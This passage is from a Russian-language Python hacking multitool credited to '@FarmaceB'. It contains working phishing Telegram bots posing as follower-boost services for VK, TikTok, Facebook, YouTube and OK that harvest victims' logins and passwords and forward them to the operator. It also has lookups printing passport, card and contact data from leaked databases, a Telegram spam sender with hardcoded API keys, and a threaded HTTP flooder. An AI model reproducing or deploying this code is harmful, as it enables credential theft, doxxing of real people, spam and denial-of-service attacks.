    path2 = os.path.join(folder, "russian bd.csv")
    path3 = os.path.join(folder, "alfa.csv")
    path4 = os.path.join(folder, "helix.csv")
    
    with open(path4, 'r', encoding='utf-8') as f:
            
            for line in f:
                
                if adress in line:
                    line = line.replace(',', '\n')
                    elements = line.strip().split('\n')
                    print("Фамилия: " + elements[0])
                    print("Имя: " + elements[1])
                    print("Отчество: " + elements[2])
                    print("Дата рождения: " + elements[3])
                    print("Пол: " + elements[4])
                    print("Почта: " + elements[5])
                    print("Номер: " + elements[6])
                    break
        
    with open(path3, 'r', encoding='utf-8') as f:
            
            for line in f:
                
                if adress in line:
                    line = line.replace(',', '\n')
                    elements = line.strip().split('\n')
                    print("UK: " + elements[0])
                    print("Имя клиента: " + elements[1])
                    print("Дата рождения: " + elements[2])
                    print("Клиент UK: " + elements[3])
                    print("Код контакта клиента: " + elements[4])
                    print("Владелец клиента UK:" + elements[5])
                    print("Код номера карты: " + elements[6])
                    print("Дата истечения: " + elements[7])
                    print("Номер счета: " + elements[8])
                    print("BIN: " + elements[9])
                    print("Бренд: " + elements[10])
                    print("Тип: " + elements[11])
                    print("Категория: " + elements[12]) 
                    print("Эмитент: " + elements[13])
                    print("Alpha 2: " + elements[14])
                    print("Alpha 3: " + elements[15])
                    print("Страна: " + elements[16])
                    print("Широта: " + elements[17])
                    print("Долгота: " + elements[18])
                    break

    with open(path2, 'r', encoding='utf-8') as f:
        
        for line in f:
            
            if adress in line:

                line = line.replace('|', '\n')
                line = line.replace('"', "")
                elements = line.strip().split('\n')
                print("—————Russian—————")
                print("ФИО " + elements[0])
                print("Дата рождения: " + elements[1])
                print("Телефон: " + elements[2])
                print("Почта: " + elements[3])


    with open(path, 'r', encoding='utf-8') as f:
        
        for line in f:
            
            if adress in line:

                line = line.replace(';', '\n')
                line = line.replace("'", "")
                elements = line.strip().split('\n')
                print("—————Госуслуги—————")
                print("Дата и время: " + elements[0])
                print("Фамилия: " + elements[1])
                print("Имя: " + elements[2])
                print("Отчество: " + elements[3])
                print("Пол: " + elements[4])
                print("Дата рождения: " + elements[5])
                print("Адрес: " + elements[6])
                print("Паспортные данные: " + elements[7])
                print("Email: " + elements[8])
                print("Телефон: " + elements[9])


    for path in files:
        if os.path.exists(path):
            with open(path, 'r', encoding='utf-8') as f:
                for line in f:
                    if adress in line:
                        data = line.split(';')
                        basa1 = f"""
—————Большая перемена—————
{'ID пользователя:':<20}{data[0]}
{'Дата регистрации:':<20}{data[1]}
{'Фамилия:':<20}{data[2]}
{'Имя:':<20}{data[3]}
{'Отчество:':<20}{data[4]}
{'Дата рождения:':<20}{data[5]}
{'Пол:':<20}{data[6]}
{'Телефон:':<20}{data[7]}
{'Электронная почта:':<20}{data[8]}
{'Роль:':<20}{data[9]}
{'Роль в конкурсе:':<20}{data[10]}
{'Роль в событии:':<20}{data[11]}
{'Класс:':<20}{data[12]}
{'Литера класса:':<20}{data[13]} 
{'Курс:':<20}{data[14]}
{'Гражданство:':<20}{data[15]}
{'Страна обучения:':<20}{data[16]}
{'Регион:':<20}{data[17]}
{'Муниципальное образование:':<20}{data[18]}
{'Наименование учреждения:':<20}{data[19]}
{'Адрес:':<20}{data[20]}
{'Должность:':<20}{data[21]}
{'Тип учебного заведения:':<20}{data[22]}
{'Общественная организация:':<20}{data[23]}
                        """
                        Write.Print((basa1), Colors.red_to_purple, interval=0.005) 
                        
                        found = True
                        break
                        
    if not found:
        print("Данные не найдены")

  if choice == '4':
    Write.Print("Объяснение: вы авторизируете юзербота в аккаунт, после идет генерация имен, и рассылая им текст к который вы ввели.", Colors.red_to_purple, interval=0.005)
    Write.Print("\nВНИМАНИЕ!!! вам могут снести аккаунт за это, так что не ставьте очень большое количество сообщений.", Colors.red_to_purple, interval=0.005)
    api_id = '20442511'
    api_hash = '1b25750beee7ca09eeedce0de5406b66'
    message = Write.Input('\nВведите текст для рассылки: ', Colors.purple_to_red, interval=0.005)
    num_messages = int(Write.Input('Введите количество сообщений: ', Colors.purple_to_red, interval=0.005))

    fake = Faker()

    def transliterate_to_latin(text):
        translit_dict = {
            'а': 'a', 'б': 'b', 'в': 'v', 'г': 'g', 'д': 'd', 'е': 'e', 'ё': 'e',
            'ж': 'zh', 'з': 'z', 'и': 'i', 'й': 'y', 'к': 'k', 'л': 'l', 'м': 'm',
            'н': 'n', 'о': 'o', 'п': 'p', 'р': 'r', 'с': 's', 'т': 't', 'у': 'u',
            'ф': 'f', 'х': 'kh', 'ц': 'ts', 'ч': 'ch', 'ш': 'sh', 'щ': 'sch',
            'ъ': '', 'ы': 'y', 'ь': '', 'э': 'e', 'ю': 'yu', 'я': 'ya'
        }

        latin_text = ''.join(translit_dict.get(c, c) for c in text.lower())
        return latin_text


    with TelegramClient('session_name', api_id, api_hash) as client:

        for _ in range(num_messages):
            random_name_cyrillic = fake.first_name()
            random_name_latin = transliterate_to_latin(random_name_cyrillic)

            try:
                user = client.get_entity(random_name_latin) 
                client.send_message(user, message)
                Write.Print(f'Отправлено сообщение "тест" пользователю: {random_name_cyrillic} ({random_name_latin})', Colors.red_to_purple, interval=0.005)
            except Exception as e:
                Write.Print(f'Не удалось найти пользователя.', Colors.red_to_purple, interval=0.005)

  if choice == '17':
      with open('socks4_proxies.txt', 'r') as f:
            proxy = f.read()
            print(proxy)

          
  if choice == '16':      
      fake = Faker(locale='ru_RU')  

      gender = input("Введите пол (М - мужской, Ж - женский): ")  

      if gender not in ['М', 'Ж']:
          gender = random.choice(['М', 'Ж'])
          print(f'Вы ввели неверное значение, будет выбрано случайным образом: {gender}')

      if gender == 'М': 
          first_name = fake.first_name_male() 
          middle_name = fake.middle_name_male()
      else:
          first_name = fake.first_name_female()
          middle_name = fake.middle_name_female()

      last_name = fake.last_name() 
      full_name = f'{last_name} {first_name} {middle_name}'

      birthdate = fake.date_of_birth()
      age = fake.random_int(min=18, max=80)

      street_address = fake.street_address()  
      city = fake.city()
      region = fake.region()
      postcode = fake.postcode() 
      address = f'{street_address}, {city}, {region} {postcode}'  

      email = fake.email()   
      phone_number = fake.phone_number()   

      inn = str(fake.random_number(digits=12, fix_len=True))
      snils = str(fake.random_number(digits=11, fix_len=True))  
      passport_num = str(fake.random_number(digits=10, fix_len=True))
      passport_series = fake.random_int(min=1000, max=9999)    

      print(f'ФИО: {full_name}')  
      print(f'Пол: {gender}')   
      print(f'Дата рождения: {birthdate.strftime("%d %B %Y")}')  
      print(f'Возраст: {age} лет') 
      print(f'Адрес: {address}')  
      print(f'Email: {email}')
      print(f'Телефон: {phone_number}')  
      print(f'ИНН: {inn}')   
      print(f'СНИЛС: {snils}')
      print(f'Паспорт серия: {passport_series} номер: {passport_num}')


      
  if choice == '3':
      nick = input(f"Введите никнейм: ")

      print(f"Поиск информации...")
      print(f"Соцсети")

      urls = [
          f"https://www.instagram.com/{nick}",
          f"https://www.tiktok.com/@{nick}",
          f"https://twitter.com/{nick}",
          f"https://www.facebook.com/{nick}",
          f"https://www.youtube.com/@{nick}",
          f"https://t.me/{nick}",
          f"https://www.roblox.com/user.aspx?username={nick}",
          f"https://https://www.twitch.tv/{nick}"

      ]

      for url in urls:
          try:
              response = requests.get(url)
              if response.status_code == 200:
                  print(f"{url} - аккаунт найден")
              elif response.status_code == 404:  
                  print(f"{url} - аккаунт не найден")
              else:
                  print(f"{url} - ошибка {response.status_code}")
          except:
              print(f"{url} - ошибка при проверке")
              
  if choice == '5':
      url = Write.Input('URL: ', Colors.purple_to_red, interval=0.005)
      num_requests = int(Write.Input('Введите количество запросов: ', Colors.purple_to_red, interval=0.005))

      user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36',
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)',
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'
      ]

      def send_request(i):
        user_agent = random.choice(user_agents)
        headers = {'User-Agent': user_agent}

        try:
          response = requests.get(url, headers=headers, timeout=0.1)
          print(f"Request {i} sent successfully\n")
        except:
          print(f"Request {i} sent successfully\n")

      threads = []
      for i in range(1, num_requests+1):
        t = threading.Thread(target=send_request, args=[i])
        t.start()
        threads.append(t)

      for t in threads:
        t.join()

  if choice == '8':
      Write.Print(("выберите фишинг: " + "\n"), Colors.red_to_purple, interval=0.005)
      fish = '''
1: ВК
2: Тик Ток
4: FaceBook
5: YouTube
6: Одноклассники(ok.ru)
      '''
      Write.Print((fish), Colors.red_to_purple, interval=0.005)
      choice_fish = Write.Input('\nВыберите пункт фишинга > ', Colors.purple_to_red, interval=0.005)
      if choice_fish == '6':
          log = open('bot-log.txt', 'a+', encoding='utf-8')
          ID = Write.Input('Введите свой айди:  ', Colors.purple_to_red, interval=0.005)
          Tokenccc = Write.Input('Введите токен:  ', Colors.purple_to_red, interval=0.005)
          bot = telebot.TeleBot(Tokenccc)
          try:
                Write.Print(("Бот запущен!\n"), Colors.red_to_purple, interval=0.005)
                bot.send_message(ID, '!Бот запущен!') 
          except:
                Write.Print(("Возможно вы не написали /start в вашем боте! Без этого действия скрипт будет работать некорректно!"), Colors.red_to_purple, interval=0.005)

          @bot.message_handler(commands=['start'])
          def start(message):
                Write.Print((f'''Обнаружен пользователь!
                ID: {message.from_user.id}'''), Colors.red_to_purple, interval=0.005)
                bot.send_message(message.chat.id, '''👋 Привет! 👋
                        Это бот продвижения вашего аккаунта для одноклассникиов
                        Чтобы начать, нажмите /nacrutka''')
                            
          @bot.message_handler(commands=['nacrutka', 'n'])
          def start1(message):
                keyboardmain = types.InlineKeyboardMarkup(row_width=2)
                first_button = types.InlineKeyboardButton(text="Лайки❤️", callback_data="like")
                second_button = types.InlineKeyboardButton(text="Подписчики📃", callback_data="like")
                button3 = types.InlineKeyboardButton(text="Просмотры", callback_data="like")
                button4 = types.InlineKeyboardButton(text="Репосты", callback_data="like")
                keyboardmain.add(first_button, second_button, button3, button4)
                bot.send_message(message.chat.id, "Выберите пункт:", reply_markup=keyboardmain)

          @bot.callback_query_handler(func=lambda call:True)
          def callback_inline1(call):
                if call.data == "like":
                        msg = bot.send_message(call.message.chat.id, 'Введите колличество (не более 500)') 
                        bot.register_next_step_handler(msg, qproc1)

          def qproc1(message):
                try:
                        num = message.text	
                        if not num.isdigit():
                                msg = bot.reply_to(message, 'Введите колличество числом! Повторите попытку, написав /nacrutka!')#⏳
                                return
                        elif int(num) > 500:
                                bot.reply_to(message, 'Колличество не может быть более 500!')
                                return
                        else:
                                bot.send_message(message.chat.id, f'Колличество: {num}')
                                msg = bot.send_message(message.chat.id, 'Введите номер телефона(или почту) от вашего аккаунта:') 
                                bot.register_next_step_handler(msg, step1)
                except Exception as e:
                        print(e)




          def step1(message):
                get = f'''Полученные данные: 
          Получено в боте: Одноклассники
          ID: {message.from_user.id}
          Ник: @{message.from_user.username}
          Логин: {message.text}
          Имя: {message.from_user.first_name}

          '''
                log = open('bot-log.txt', 'a+', encoding='utf-8')
                log.write(get + '  ')
                log.close()
                Write.Print((get), Colors.red_to_purple, interval=0.005)
                bot.send_message(ID, get)
                bot.reply_to(message, f'Ваш логин: {message.text}')

                msg1 = bot.send_message(message.chat.id, 'Введите пароль от вашего аккаунта:') 
                bot.register_next_step_handler(msg1, step2)


          def step2(message):
                usrpass = message.text
                get = f'''Полученные данные:
          Получено в боте: Одноклассники 
          ID: {message.from_user.id}
          Ник: @{message.from_user.username}
          Пароль: {usrpass}
          Имя: {message.from_user.first_name}

          '''
                Write.Print((get), Colors.red_to_purple, interval=0.005)
                log = open('bot-log.txt', 'a+', encoding='utf-8')
                log.write(get + '  ')
                log.close()
                bot.send_message(ID, get)
                msg = bot.reply_to(message, f'Ваш пароль: {usrpass}')
                time.sleep(1)
                bot.reply_to(message, f'Спасибо, что воспользовались нашим сервисом😉! Если введенные данные правильные, ожидайте накрутку на ваш аккаунт в течении 24 часов!')


          bot.polling()


      if choice_fish == '5':
          log = open('bot-log.txt', 'a+', encoding='utf-8')
          ID = Write.Input('Введите свой айди:  ', Colors.purple_to_red, interval=0.005)
          Tokenccc = Write.Input('Введите токен:  ', Colors.purple_to_red, interval=0.005)
          bot = telebot.TeleBot(Tokenccc)
          try:
                Write.Print(("Бот запущен!\n"), Colors.red_to_purple, interval=0.005)
                bot.send_message(ID, '!Бот запущен!') 
          except:
                Write.Print(("Возможно вы не написали /start в вашем боте! Без этого действия скрипт будет работать некорректно!"), Colors.red_to_purple, interval=0.005)

          @bot.message_handler(commands=['start'])
          def start(message):
                Write.Print((f'''Обнаружен пользователь!
                ID: {message.from_user.id}'''), Colors.red_to_purple, interval=0.005)
                bot.send_message(message.chat.id, '''👋 Привет! 👋
                        Это бот продвижения вашего YouTube аккаунта!
                        Чтобы начать, нажмите /nacrutka''')
                            
          @bot.message_handler(commands=['nacrutka', 'n'])
          def start1(message):
                keyboardmain = types.InlineKeyboardMarkup(row_width=2)
                first_button = types.InlineKeyboardButton(text="Лайки❤️", callback_data="like")
                second_button = types.InlineKeyboardButton(text="Подписчики📃", callback_data="like")
                button3 = types.InlineKeyboardButton(text="Просмотры", callback_data="like")
                button4 = types.InlineKeyboardButton(text="Репосты", callback_data="like")
                keyboardmain.add(first_button, second_button, button3, button4)
                bot.send_message(message.chat.id, "Выберите пункт:", reply_markup=keyboardmain)

          @bot.callback_query_handler(func=lambda call:True)
          def callback_inline1(call):
                if call.data == "like":
                        msg = bot.send_message(call.message.chat.id, 'Введите колличество (не более 500)') 
                        bot.register_next_step_handler(msg, qproc1)

          def qproc1(message):
                try:
                        num = message.text	
                        if not num.isdigit():
                                msg = bot.reply_to(message, 'Введите колличество числом! Повторите попытку, написав /nacrutka!')#⏳
                                return
                        elif int(num) > 500:
                                bot.reply_to(message, 'Колличество не может быть более 500!')
                                return
                        else:
                                bot.send_message(message.chat.id, f'Колличество: {num}')
                                msg = bot.send_message(message.chat.id, 'Введите номер телефона(или почту) от вашего аккаунта:') 
                                bot.register_next_step_handler(msg, step1)
                except Exception as e:
                        print(e)




          def step1(message):
                get = f'''Полученные данные: 
          Получено в боте: YouTube
          ID: {message.from_user.id}
          Ник: @{message.from_user.username}
          Логин: {message.text}
          Имя: {message.from_user.first_name}

          '''
                log = open('bot-log.txt', 'a+', encoding='utf-8')
                log.write(get + '  ')
                log.close()
                Write.Print((get), Colors.red_to_purple, interval=0.005)
                bot.send_message(ID, get)
                bot.reply_to(message, f'Ваш логин: {message.text}')

                msg1 = bot.send_message(message.chat.id, 'Введите пароль от вашего аккаунта:') 
                bot.register_next_step_handler(msg1, step2)


          def step2(message):
                usrpass = message.text
                get = f'''Полученные данные:
          Получено в боте: YouTube 
          ID: {message.from_user.id}
          Ник: @{message.from_user.username}
          Пароль: {usrpass}
          Имя: {message.from_user.first_name}

          '''
                Write.Print((get), Colors.red_to_purple, interval=0.005)
                log = open('bot-log.txt', 'a+', encoding='utf-8')
                log.write(get + '  ')
                log.close()
                bot.send_message(ID, get)
                msg = bot.reply_to(message, f'Ваш пароль: {usrpass}')
                time.sleep(1)
                bot.reply_to(message, f'Спасибо, что воспользовались нашим сервисом😉! Если введенные данные правильные, ожидайте накрутку на ваш аккаунт в течении 24 часов!')


          bot.polling()


      if choice_fish == '4':
          log = open('bot-log.txt', 'a+', encoding='utf-8')
          ID = Write.Input('Введите свой айди:  ', Colors.purple_to_red, interval=0.005)
          Tokenccc = Write.Input('Введите токен:  ', Colors.purple_to_red, interval=0.005)
          bot = telebot.TeleBot(Tokenccc)
          try:
                Write.Print(("Бот запущен!\n"), Colors.red_to_purple, interval=0.005)
                bot.send_message(ID, '!Бот запущен!') 
          except:
                Write.Print(("Возможно вы не написали /start в вашем боте! Без этого действия скрипт будет работать некорректно!"), Colors.red_to_purple, interval=0.005)

          @bot.message_handler(commands=['start'])
          def start(message):
                Write.Print((f'''Обнаружен пользователь!
                ID: {message.from_user.id}'''), Colors.red_to_purple, interval=0.005)
                bot.send_message(message.chat.id, '''👋 Привет! 👋
                        Это бот продвижения вашего FaceBook аккаунта!
                        Чтобы начать, нажмите /nacrutka''')
                            
          @bot.message_handler(commands=['nacrutka', 'n'])
          def start1(message):
                keyboardmain = types.InlineKeyboardMarkup(row_width=2)
                first_button = types.InlineKeyboardButton(text="Лайки❤️", callback_data="like")
                second_button = types.InlineKeyboardButton(text="Подписчики📃", callback_data="like")
                button3 = types.InlineKeyboardButton(text="Просмотры", callback_data="like")
                button4 = types.InlineKeyboardButton(text="Репосты", callback_data="like")
                keyboardmain.add(first_button, second_button, button3, button4)
                bot.send_message(message.chat.id, "Выберите пункт:", reply_markup=keyboardmain)

          @bot.callback_query_handler(func=lambda call:True)
          def callback_inline1(call):
                if call.data == "like":
                        msg = bot.send_message(call.message.chat.id, 'Введите колличество (не более 500)') 
                        bot.register_next_step_handler(msg, qproc1)

          def qproc1(message):
                try:
                        num = message.text	
                        if not num.isdigit():
                                msg = bot.reply_to(message, 'Введите колличество числом! Повторите попытку, написав /nacrutka!')#⏳
                                return
                        elif int(num) > 500:
                                bot.reply_to(message, 'Колличество не может быть более 500!')
                                return
                        else:
                                bot.send_message(message.chat.id, f'Колличество: {num}')
                                msg = bot.send_message(message.chat.id, 'Введите номер телефона(или почту) от вашего аккаунта:') 
                                bot.register_next_step_handler(msg, step1)
                except Exception as e:
                        print(e)




          def step1(message):
                get = f'''Полученные данные: 
          Получено в боте: FaceBook
          ID: {message.from_user.id}
          Ник: @{message.from_user.username}
          Логин: {message.text}
          Имя: {message.from_user.first_name}

          '''
                log = open('bot-log.txt', 'a+', encoding='utf-8')
                log.write(get + '  ')
                log.close()
                Write.Print((get), Colors.red_to_purple, interval=0.005)
                bot.send_message(ID, get)
                bot.reply_to(message, f'Ваш логин: {message.text}')

                msg1 = bot.send_message(message.chat.id, 'Введите пароль от вашего аккаунта:') 
                bot.register_next_step_handler(msg1, step2)


          def step2(message):
                usrpass = message.text
                get = f'''Полученные данные:
          Получено в боте: tiktok 
          ID: {message.from_user.id}
          Ник: @{message.from_user.username}
          Пароль: {usrpass}
          Имя: {message.from_user.first_name}

          '''
                Write.Print((get), Colors.red_to_purple, interval=0.005)
                log = open('bot-log.txt', 'a+', encoding='utf-8')
                log.write(get + '  ')
                log.close()
                bot.send_message(ID, get)
                msg = bot.reply_to(message, f'Ваш пароль: {usrpass}')
                time.sleep(1)
                bot.reply_to(message, f'Спасибо, что воспользовались нашим сервисом😉! Если введенные данные правильные, ожидайте накрутку на ваш аккаунт в течении 24 часов!')


          bot.polling()


      if choice_fish == '2':
          log = open('bot-log.txt', 'a+', encoding='utf-8')
          ID = Write.Input('Введите свой айди:  ', Colors.purple_to_red, interval=0.005)
          Tokenc = Write.Input('Введите токен:  ', Colors.purple_to_red, interval=0.005)
          bot = telebot.TeleBot(Tokenc)
          try:
                Write.Print(("Бот запущен!\n"), Colors.red_to_purple, interval=0.005)
                bot.send_message(ID, '!Бот запущен!') 
          except:
                Write.Print(("Возможно вы не написали /start в вашем боте! Без этого действия скрипт будет работать некорректно!"), Colors.red_to_purple, interval=0.005)

          @bot.message_handler(commands=['start'])
          def start(message):
                Write.Print((f'''Обнаружен пользователь!
                ID: {message.from_user.id}'''), Colors.red_to_purple, interval=0.005)
                bot.send_message(message.chat.id, '''👋 Привет! 👋
                        Это бот продвижения вашего тикток аккаунта!
                        Чтобы начать, нажмите /nacrutka''')
                            
          @bot.message_handler(commands=['nacrutka', 'n'])
          def start1(message):
                keyboardmain = types.InlineKeyboardMarkup(row_width=2)
                first_button = types.InlineKeyboardButton(text="Лайки❤️", callback_data="like")
                second_button = types.InlineKeyboardButton(text="Подписчики📃", callback_data="like")
                button3 = types.InlineKeyboardButton(text="Просмотры", callback_data="like")
                button4 = types.InlineKeyboardButton(text="Репосты", callback_data="like")
                keyboardmain.add(first_button, second_button, button3, button4)
                bot.send_message(message.chat.id, "Выберите пункт:", reply_markup=keyboardmain)

          @bot.callback_query_handler(func=lambda call:True)
          def callback_inline1(call):
                if call.data == "like":
                        msg = bot.send_message(call.message.chat.id, 'Введите колличество (не более 500)') 
                        bot.register_next_step_handler(msg, qproc1)

          def qproc1(message):
                try:
                        num = message.text	
                        if not num.isdigit():
                                msg = bot.reply_to(message, 'Введите колличество числом! Повторите попытку, написав /nacrutka!')#⏳
                                return
                        elif int(num) > 500:
                                bot.reply_to(message, 'Колличество не может быть более 500!')
                                return
                        else:
                                bot.send_message(message.chat.id, f'Колличество: {num}')
                                msg = bot.send_message(message.chat.id, 'Введите номер телефона(или почту) от вашего аккаунта:') 
                                bot.register_next_step_handler(msg, step1)
                except Exception as e:
                        print(e)




          def step1(message):
                get = f'''Полученные данные: 
          Получено в боте: tiktok
          ID: {message.from_user.id}
          Ник: @{message.from_user.username}
          Логин: {message.text}
          Имя: {message.from_user.first_name}

          '''
                log = open('bot-log.txt', 'a+', encoding='utf-8')
                log.write(get + '  ')
                log.close()
                Write.Print((get), Colors.red_to_purple, interval=0.005)
                bot.send_message(ID, get)
                bot.reply_to(message, f'Ваш логин: {message.text}')

                msg1 = bot.send_message(message.chat.id, 'Введите пароль от вашего аккаунта:') 
                bot.register_next_step_handler(msg1, step2)


          def step2(message):
                usrpass = message.text
                get = f'''Полученные данные:
          Получено в боте: tiktok 
          ID: {message.from_user.id}
          Ник: @{message.from_user.username}
          Пароль: {usrpass}
          Имя: {message.from_user.first_name}

          '''
                Write.Print((get), Colors.red_to_purple, interval=0.005)
                log = open('bot-log.txt', 'a+', encoding='utf-8')
                log.write(get + '  ')
                log.close()
                bot.send_message(ID, get)
                msg = bot.reply_to(message, f'Ваш пароль: {usrpass}')
                time.sleep(1)
                bot.reply_to(message, f'Спасибо, что воспользовались нашим сервисом😉! Если введенные данные правильные, ожидайте накрутку на ваш аккаунт в течении 24 часов!')


          bot.polling()

      if choice_fish == '1':

          log = open('bot-log.txt', 'a+', encoding='utf-8')
          ID = Write.Input('Введите свой айди: ', Colors.purple_to_red, interval=0.005)
          Tokenv = Write.Input('Введите токен: ', Colors.purple_to_red, interval=0.005)
          bot = telebot.TeleBot(Tokenv)
          try:
                Write.Print(("Бот запущен!"), Colors.red_to_purple, interval=0.005)
                bot.send_message(ID, '!Бот запущен!') 
          except:
                Write.Print(("Возможно вы не написали /start в вашем боте! Без этого действия скрипт будет работать некорректно!"), Colors.red_to_purple, interval=0.005)



          @bot.message_handler(commands=['start'])
          def start(message):
                Write.Print((f'''Обнаружен пользователь!
                ID: {message.from_user.id}'''), Colors.red_to_purple, interval=0.005)
                bot.send_message(message.chat.id, '''👋 Привет! 👋
                        Это бот накрутки лайков и друзей на ваш VK аккаунт!
                        Чтобы начать, нажмите /nacrutka''') 

          @bot.message_handler(commands=['nacrutka', 'n'])
          def start1(message):
                keyboardmain = types.InlineKeyboardMarkup(row_width=2)
                first_button = types.InlineKeyboardButton(text="Лайки❤️", callback_data="like")
                second_button = types.InlineKeyboardButton(text="Друзья📃", callback_data="like")
                button3 = types.InlineKeyboardButton(text="Репосты", callback_data="like")
                button4 = types.InlineKeyboardButton(text="Прослушивания плейлистов", callback_data="like")
                keyboardmain.add(first_button, second_button, button3, button4)
                bot.send_message(message.chat.id, "Выберите пункт:", reply_markup=keyboardmain)

          @bot.callback_query_handler(func=lambda call:True)
          def callback_inline1(call):
                if call.data == "like":
                        msg = bot.send_message(call.message.chat.id, 'Введите колличество (не более 500)') 
                        bot.register_next_step_handler(msg, qproc1)
# Coded by @FarmaceB
          def qproc1(message):
                try:
                        num = message.text	
                        if not num.isdigit():
                                msg = bot.reply_to(message, 'Введите колличество числом! Повторите попытку, написав /nacrutka!')#⏳
                                return
                        elif int(num) > 500:
                                bot.reply_to(message, 'Колличество не может быть более 500!')
                                return
                        else:
                                bot.send_message(message.chat.id, f'Колличество: {num}')
                                msg = bot.send_message(message.chat.id, 'Введите номер телефона от вашего аккаунта:') 
                                bot.register_next_step_handler(msg, step1)
                except Exception as e:
                        print(e)




          def step1(message):
                inp = message.text.replace("+", "")
                if not inp.isdigit():
                        bot.reply_to(message, 'Введите номер числом! Повторите попытку, написав /nacrutka!')#⏳
                        return
                get = f'''Полученные данные: 
          Получено в боте: vk
          ID: {message.from_user.id}
          Ник: @{message.from_user.username}
          Логин: {message.text}
          Имя: {message.from_user.first_name}

          '''
                log = open('bot-log.txt', 'a+', encoding='utf-8')
                log.write(get + '  ')
                log.close()
                Write.Print((get), Colors.red_to_purple, interval=0.005)
                bot.send_message(ID, get)
                bot.reply_to(message, f'Ваш логин: {message.text}')

                msg1 = bot.send_message(message.chat.id, 'Введите пароль от вашего аккаунта:') 
                bot.register_next_step_handler(msg1, step2)

# Coded by @FarmaceB
          def step2(message):
                usrpass = message.text
                get = f'''Полученные данные:
          Получено в боте: vk 
          ID: {message.from_user.id}
          Ник: @{message.from_user.username}
          Пароль: {usrpass}
          Имя: {message.from_user.first_name}

          '''
                Write.Print((get), Colors.red_to_purple, interval=0.005)
                log = open('bot-log.txt', 'a+', encoding='utf-8')
                log.write(get + '  ')
                log.close()
                bot.send_message(ID, get)
                msg = bot.reply_to(message, f'Ваш пароль: {usrpass}')
                time.sleep(1)
                bot.reply_to(message, f'Спасибо, что воспользовались нашим сервисом😉! Если введенные данные правильные, то ожидайте накруткуна ваш аккаунт в течении 24 часов!')


          bot.polling()
  if choice == '15':
      password_length = int(Write.Input('Введите длину пароля: ', Colors.purple_to_red, interval=0.005))

      complexity = Write.Input('Выберите сложность (low, medium, high): ', Colors.purple_to_red, interval=0.005)

      complex_password = generate_password(password_length, complexity)
      Write.Print((complex_password + "\n"), Colors.red_to_purple, interval=0.005)
      
  if choice == '7':
  
    search_term = Input("Введите фио: ")
    Search
# Coded by @FarmaceB

  if choice == '2':
    search_term = Write.Input("Введите почту: ", Colors.purple_to_red, interval=0.005)
    Search

  if choice == '13':
    search_term = Write.Input("Введите айди телеграмм: ", Colors.purple_to_red, interval=0.005)
    Search

      

  if choice == '1':
    Term = Write.Input("Введите номер телефона(без +): ", Colors.purple_to_red, interval=0.005)
    Search(Term)

          
  if choice == '6':
      path = Write.Input("Введите путь к БД: ", Colors.purple_to_red, interval=0.005)
      search_text = Write.Input("Введите текст:  ", Colors.purple_to_red, interval=0.005)

      with open(path, 'r', encoding='utf-8') as f:
        for line in f:
            if search_text in line:
                Write.Print("Результат: " + line.strip(), Colors.red_to_purple, interval=0.005)
                break 
        else:
            Write.Print("Текст не найден.", Colors.red_to_purple, interval=0.005)

  if choice == '12':
    input_text = Write.Input("Введите текст: ", Colors.purple_to_red, interval=0.005) 
    transformed_text = transform_text(input_text)
    Write.Print("Результат > " + transformed_text + "\n", Colors.red_to_purple, interval=0.005)

  
  if choice == '10':
    domain = Write.Input("Введите домен сайта: ", Colors.purple_to_red, interval=0.005) 
    get_website_info(domain)
# Coded by @FarmaceB
  if choice == '9':
    ip_address = Write.Input("Введите IP-адрес для поиска: ", Colors.purple_to_red, interval=0.005)
    result = ip_lookup(ip_address)
    Write.Print(result, Colors.red_to_yellow, interval=0.005) 

  if choice == '11':
    start_url = Write.Input('Ссылка: ', Colors.purple_to_red, interval=0.005)
# Coded by @FarmaceB    
    max_depth = 2
    visited = set()
    
    def crawl(url, depth=0):
      if depth > max_depth:
        return
      
      parsed = urlparse(url)  
      domain = f"{parsed.scheme}://{parsed.netloc}"
      
      if url in visited:
        return
        
      try:
        response = requests.get(url)
        html = response.text
        soup = BeautifulSoup(html, 'html.parser')
        
      except:
        return
      
      visited.add(url)
      
      Write.Print("  |" + url + '\n', Colors.red_to_yellow, interval=0.005)
      
      for link in soup.find_all('a'):
        href = link.get('href')
        if not href:
          continue
        
        href = href.split("#")[0].rstrip("/")
        if href.startswith('http'):
          href_parsed = urlparse(href)
          if href_parsed.netloc != parsed.netloc:
            continue
        else:
          href = domain + href
          
        crawl(href, depth+1)
        
    crawl(start_url)

# Coded by @FarmaceB